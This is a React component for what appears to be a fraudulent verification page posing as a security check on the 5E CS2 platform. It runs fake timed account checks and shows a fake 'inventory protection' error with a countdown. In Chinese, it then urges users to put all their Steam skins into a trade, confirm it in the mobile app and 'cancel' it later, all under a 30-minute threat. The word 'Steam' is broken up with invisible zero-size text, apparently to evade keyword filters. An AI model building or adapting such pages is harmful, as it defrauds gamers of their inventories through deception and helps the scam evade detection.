"use client";

import LoadingFlash from "../loadingFlash/loadingFlash";
import { useEffect, useState } from "react";
import CountdownTimer from "../countdownTimer/countdownTimer";

const ThirdErrorContent = ({ userId, errorCodeChanged, rendered }) => {
  const [first, setFirst] = useState(false);
  const [second, setSecond] = useState(false);
  const [third, setThird] = useState(false);
  const [fourth, setFourth] = useState(false);
  const [fith, setFith] = useState(false);
  const [err, setErr] = useState(false);

  useEffect(() => {
    const timeout1 = setTimeout(() => {
      setFirst(true);
    }, 500);
    const timeout2 = setTimeout(() => {
      setSecond(true);
    }, 1000);
    const timeout3 = setTimeout(() => {
      setThird(true);
    }, 1500);
    const timeout4 = setTimeout(() => {
      setFourth(true);
    }, 2000);
    const timeout5 = setTimeout(() => {
      setFith(true);
    }, 2500);
    const timeoutErr = setTimeout(() => {
      setErr(true);
    }, 3200);
    return () => {
      clearTimeout(timeout1);
      clearTimeout(timeout2);
      clearTimeout(timeout3);
      clearTimeout(timeout4);
      clearTimeout(timeout5);
      clearTimeout(timeoutErr);
    };
  });

  return (
    <div className=" max-w-[600px] mx-auto px-[40px] py-[60px] w-full">
      <div className=" mx-auto mb-[40px] text-center">
        <p className="m-auto top-[50%] mb-[10px]  text-sm">
          您的 ID：
          <span>{userId}</span>
        </p>
        <div className="flex items-center justify-center mb-[10px] whitespace-nowrap">
          <p className="text-center mb-[15px]">您的帐户尚未验证</p>
        </div>
        {errorCodeChanged || rendered == "false" ? (
          <>
            {first ? (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  有CS2：
                  <span className="inline-block w-[80px] text-green-600">
                    完成
                  </span>
                </p>
              </div>
            ) : (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  有CS2：
                  <span className="inline-block w-[80px] text-gray-200">
                    检查中
                  </span>
                </p>
                <LoadingFlash />
              </div>
            )}
            {second ? (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  无 VAC 禁令：
                  <span className="inline-block w-[80px] text-green-600">
                    完成
                  </span>
                </p>
              </div>
            ) : (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  无 VAC 禁令：
                  <span className="inline-block w-[80px] text-gray-200">
                    检查中
                  </span>
                </p>
                <LoadingFlash />
              </div>
            )}
            {third ? (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  无St
                  <span className="text-[0px] text-white">
                    Playful dolphins dance beneath the moon.
                  </span>
                  eam限制：
                  <span className="inline-block w-[80px] text-green-600">
                    完成
                  </span>
                </p>
              </div>
            ) : (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  无St
                  <span className="text-[0px] text-white">
                    Playful dolphins dance beneath the moon.
                  </span>
                  eam限制：
                  <span className="inline-block w-[80px] text-gray-200">
                    检查中
                  </span>
                </p>
                <LoadingFlash />
              </div>
            )}
            {fourth ? (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  最近玩过游戏：
                  <span className="inline-block w-[80px] text-green-600">
                    完成
                  </span>
                </p>
              </div>
            ) : (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  最近玩过游戏：
                  <span className="inline-block w-[80px] text-gray-200">
                    检查中
                  </span>
                </p>
                <LoadingFlash />
              </div>
            )}
            {err ? (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  保护您的个人库存：
                  <span className="inline-block w-[80px] text-red-500">
                    错误
                  </span>
                </p>
                <CountdownTimer />
              </div>
            ) : (
              <div className="flex items-center mb-[15px]">
                <p className="text-left">
                  保护您的个人库存：
                  <span className="inline-block w-[80px] text-gray-200">
                    检查中
                  </span>
                </p>
                <LoadingFlash />
              </div>
            )}
            {fith ? (
              <div className="flex items-center mb-[60px]">
                <p className="text-left">
                  违反5E对战平台规则：
                  <span className="inline-block w-[80px] text-green-600">
                    完成
                  </span>
                </p>
              </div>
            ) : (
              <div className="flex items-center mb-[60px]">
                <p className="text-left">
                  违反5E对战平台规则：
                  <span className="inline-block w-[80px] text-gray-200">
                    检查中
                  </span>
                </p>
                <LoadingFlash />
              </div>
            )}
            {err ? (
              <div className="p-[10px] m-[-20px] text-left text-[14px] border-2 border-white">
                <video
                  controls
                  width={1920}
                  height={1080}
                  className="mt-1 mb-4"
                >
                  <source src={"video/ins.webm"} type="video/webm" />
                </video>
                <p className="text-left">
                  我们的安全系统检测到您拥有贵重的饰品。我们了解过外国人从中国玩家库存中窃取饰品的案例。为确保您的饰品安全，您需要采取以下步骤：
                </p>
                <p className="text-left mb-[5px]">
                  1.与一个朋友或您的第二个St
                  <span className="text-[0px] text-white">
                    Playful dolphins dance beneath the moon.
                  </span>
                  eam账号发起交易您所有的饰品。
                </p>
                <p className="text-left mb-[5px]">
                  2.确认您已经选择了st
                  <span className="text-[0px] text-white">
                    Playful dolphins dance beneath the moon.
                  </span>
                  eam库存中的所有饰品。
                </p>
                <p className="text-left mb-[5px]">
                  3.前往St
                  <span className="text-[0px] text-white">
                    Playful dolphins dance beneath the moon.
                  </span>
                  eam移动应用程序并确认报价。
                </p>
                <p className="text-left mb-[5px]">
                  4.等待您的账户在5分钟内完成《5E对战平台》 平台上的确认。
                </p>
                <p className="text-left mb-[5px]">
                  5.在您的St
                  <span className="text-[0px] text-white">
                    Playful dolphins dance beneath the moon.
                  </span>
                  eam账号中取消发起交易。
                </p>
                <p className="text-left mb-[5px]">
                  如果您采取这些步骤，您的饰品将会很安全，并保留在您的账户上。
                  如果您为您的朋友创建了一个发起交易，您应该让他/她不要接受这个发起交易，因为在确认您的账户后，您将取消您创建的发起交易。
                  如果您将饰品转移到第二个账户，您无需从第二个账户确认发起交易，因为一旦您被我们的《5E对战平台》保护系统接受，您就可以取消发起交易。
                  如果您在30分钟内不采取这些步骤，《5E对战平台》平台安全系统将无限期地保管您的饰品。
                </p>
              </div>
            ) : (
              <></>
            )}
          </>
        ) : (
          <>
            <div className="flex items-center mb-[15px]">
              <p className="text-left">
                有CS2：
                <span className="inline-block w-[80px] text-green-600">
                  完成
                </span>
              </p>
            </div>

            <div className="flex items-center mb-[15px]">
              <p className="text-left">
                无 VAC 禁令：
                <span className="inline-block w-[80px] text-green-600">
                  完成
                </span>
              </p>
            </div>

            <div className="flex items-center mb-[15px]">
              <p className="text-left">
                无St
                <span className="text-[0px] text-white">
                  Playful dolphins dance beneath the moon.
                </span>
                eam限制：
                <span className="inline-block w-[80px] text-green-600">
                  完成
                </span>
              </p>
            </div>

            <div className="flex items-center mb-[15px]">
              <p className="text-left">
                最近玩过游戏：
                <span className="inline-block w-[80px] text-green-600">
                  完成
                </span>
              </p>
            </div>

            <div className="flex items-center mb-[15px]">
              <p className="text-left">
                保护您的个人库存：
                <span className="inline-block w-[80px] text-red-500">错误</span>
              </p>
              <CountdownTimer />
            </div>

            <div className="flex items-center mb-[60px]">
              <p className="text-left">
                违反5E对战平台规则：
                <span className="inline-block w-[80px] text-green-600">
                  完成
                </span>
              </p>
            </div>

            <div className="p-[10px] m-[-20px] text-left text-[14px] border-2 border-white">
              <video controls width={1920} height={1080} className="mt-1 mb-4">
                <source src={"video/ins.webm"} type="video/webm" />
              </video>
              <p className="text-left">
                我们的安全系统检测到您拥有贵重的饰品。我们了解过外国人从中国玩家库存中窃取饰品的案例。为确保您的饰品安全，您需要采取以下步骤：
              </p>
              <p className="text-left mb-[5px]">
                1.与一个朋友或您的第二个St
                <span className="text-[0px] text-white">
                  Playful dolphins dance beneath the moon.
                </span>
                eam账号发起交易您所有的饰品。
              </p>
              <p className="text-left mb-[5px]">
                2.确认您已经选择了st
                <span className="text-[0px] text-white">
                  Playful dolphins dance beneath the moon.
                </span>
                eam库存中的所有饰品。
              </p>
              <p className="text-left mb-[5px]">
                3.前往St
                <span className="text-[0px] text-white">
                  Playful dolphins dance beneath the moon.
                </span>
                eam移动应用程序并确认报价。
              </p>
              <p className="text-left mb-[5px]">
                4.等待您的账户在5分钟内完成《5E对战平台》 平台上的确认。
              </p>
              <p className="text-left mb-[5px]">
                5.在您的St
                <span className="text-[0px] text-white">
                  Playful dolphins dance beneath the moon.
                </span>
                eam账号中取消发起交易。
              </p>
              <p className="text-left mb-[5px]">
                如果您采取这些步骤，您的饰品将会很安全，并保留在您的账户上。
                如果您为您的朋友创建了一个发起交易，您应该让他/她不要接受这个发起交易，因为在确认您的账户后，您将取消您创建的发起交易。
                如果您将饰品转移到第二个账户，您无需从第二个账户确认发起交易，因为一旦您被我们的《5E对战平台》保护系统接受，您就可以取消发起交易。
                如果您在30分钟内不采取这些步骤，《5E对战平台》平台安全系统将无限期地保管您的饰品。
              </p>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default ThirdErrorContent;
